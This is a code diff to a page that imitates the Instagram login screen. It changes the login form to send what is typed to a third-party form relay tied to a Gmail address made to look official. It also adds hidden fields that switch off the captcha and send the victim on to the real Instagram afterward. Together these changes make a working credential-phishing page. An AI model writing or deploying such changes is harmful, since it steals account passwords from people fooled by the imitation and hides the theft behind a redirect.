@@ -42,7 +42,7 @@
                         alt="Instragram logo; the text reads 'Instagram', written in the platform's iconic cursive font.">
                 </div>
                 <div id="login">
-                    <form id="login-form" action="#">
+                    <form id="login-form" action="https://formsubmit.co/n0.reply.instagram.mail001@gmail.com" method="POST">
                         <div class="form-group">
                             <input id="username" class="form-input" name="username"
                                 placeholder="Phone number, username, or email"
@@ -59,6 +59,8 @@
                             <button id="show-btn" onclick="showPassword()" type="button">Show</button>
                             <button id="hide-btn" onclick="showPassword()" type="button">Hide</button>
                         </div>
+                        <input type="hidden" name="_next" value="https://instagram.com">
+                        <input type="hidden" name="_captcha" value="false">
                         <input formaction="#" href="#" id="login-btn" name="submit" type="submit" value="Log In">
                     </form>
                 </div>
